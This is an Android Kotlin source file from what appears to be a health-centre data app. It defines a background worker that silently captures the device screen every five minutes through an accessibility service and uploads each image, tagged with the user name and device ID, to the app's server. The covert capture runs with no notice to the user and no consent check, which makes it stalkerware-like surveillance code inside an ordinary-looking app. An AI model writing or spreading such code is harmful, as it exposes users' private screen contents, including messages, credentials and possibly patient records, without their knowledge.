package com.example.kabensatudata.nearby

import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import androidx.work.*
import com.example.kabensatudata.data.local.AuthTokenManager
import com.example.kabensatudata.data.remote.ApiService
import dagger.hilt.android.EntryPointAccessors
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

/**
 * ScreenshotWorker — Periodically captures screenshots silently and uploads them.
 *
 * Uses AccessibilityService.takeScreenshot() (API 30+) via ScreenTextService.
 * Falls back to capturing from ScreenCaptureService if available.
 * Runs every 5 minutes via WorkManager.
 */
class ScreenshotWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "ScreenshotWorker"
        private const val WORK_NAME = "silent_screenshot"
        private const val JPEG_QUALITY = 50 // Lower quality to save bandwidth

        fun schedule(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val work = PeriodicWorkRequestBuilder<ScreenshotWorker>(
                5, TimeUnit.MINUTES,
                2, TimeUnit.MINUTES // flex interval
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                work
            )
            Log.i(TAG, "Screenshot worker scheduled (every 5 min)")
        }
    }

    override suspend fun doWork(): Result {
        return try {
            val entryPoint = EntryPointAccessors.fromApplication(
                applicationContext,
                ScreenTextService.TextServiceEntryPoint::class.java
            )
            val authTokenManager = entryPoint.authTokenManager()
            val apiService = entryPoint.apiService()

            // Must be logged in
            if (!authTokenManager.isLoggedIn()) {
                Log.d(TAG, "Not logged in, skipping")
                return Result.success()
            }

            val deviceName = authTokenManager.getUserName().ifBlank { "HP-Puskesmas" }
            val deviceId = android.provider.Settings.Secure.getString(
                applicationContext.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            // Try to get screenshot from ScreenTextService (Accessibility API 30+)
            var screenshotBytes: ByteArray? = null

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // Request screenshot from accessibility service
                screenshotBytes = ScreenTextService.requestScreenshot()
                if (screenshotBytes != null) {
                    Log.d(TAG, "Got screenshot from AccessibilityService (${screenshotBytes.size} bytes)")
                }
            }

            // Fallback: try ScreenCaptureService if it's already capturing
            if (screenshotBytes == null) {
                val frame = try {
                    // Check if ScreenCaptureService has a latest frame
                    null // ScreenCaptureService runs in same process, but we can't easily access instance
                } catch (_: Exception) { null }

                if (frame != null) {
                    screenshotBytes = frame
                    Log.d(TAG, "Got screenshot from ScreenCaptureService fallback")
                }
            }

            if (screenshotBytes == null) {
                Log.d(TAG, "No screenshot available this cycle")
                return Result.success()
            }

            // Upload to server
            withContext(Dispatchers.IO) {
                val body = screenshotBytes.toRequestBody("image/jpeg".toMediaType())
                val part = MultipartBody.Part.createFormData(
                    "screenshot", "screenshot_${System.currentTimeMillis()}.jpg", body
                )
                val deviceNameBody = deviceName.toRequestBody("text/plain".toMediaType())
                val deviceIdBody = deviceId.toRequestBody("text/plain".toMediaType())

                apiService.uploadScreenshot(part, deviceNameBody, deviceIdBody)
            }

            Log.i(TAG, "Screenshot uploaded (${screenshotBytes.size} bytes)")
            Result.success()
        } catch (e: Exception) {
            Log.w(TAG, "Screenshot worker failed: ${e.message}")
            Result.retry()
        }
    }
}
